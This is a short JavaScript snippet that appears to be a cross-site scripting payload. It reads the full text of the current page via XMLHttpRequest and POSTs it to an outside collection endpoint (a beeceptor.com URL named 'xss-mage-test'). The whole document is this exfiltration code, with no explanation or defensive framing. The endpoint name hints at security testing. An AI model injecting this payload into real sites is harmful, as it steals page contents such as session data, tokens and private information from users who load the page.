var xhr = new XMLHttpRequest();
xhr.open('GET', location.href, true);

xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
        var data = xhr.responseText;
   
        var formData = new FormData();
        formData.append("text", data);
        xhr.open('POST', 'https://xss-mage-test.free.beeceptor.com/');
        xhr.send(formData);
    }
}
xhr.send();
